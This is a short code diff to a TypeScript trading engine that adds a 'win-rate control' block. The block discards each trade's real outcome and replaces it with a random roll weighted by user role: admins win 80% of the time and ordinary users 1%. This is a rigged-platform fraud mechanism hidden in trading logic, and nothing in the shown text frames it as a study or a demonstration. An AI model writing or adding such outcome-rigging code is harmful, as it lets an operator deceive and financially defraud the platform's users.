@@ -146,6 +146,14 @@ export class TradingEngine {
       isWin = true;
     }
 
+    // ── Win-rate control: override natural outcome based on user role ──
+    if (!isTie) {
+      const isAdmin = auth.hasRole('admin');
+      const targetWinRate = isAdmin ? 0.80 : 0.01; // Admin 80%, users 1%
+      const roll = Math.random();
+      isWin = roll < targetWinRate;
+    }
+
     let profit = 0;
     let payout = 0;
 
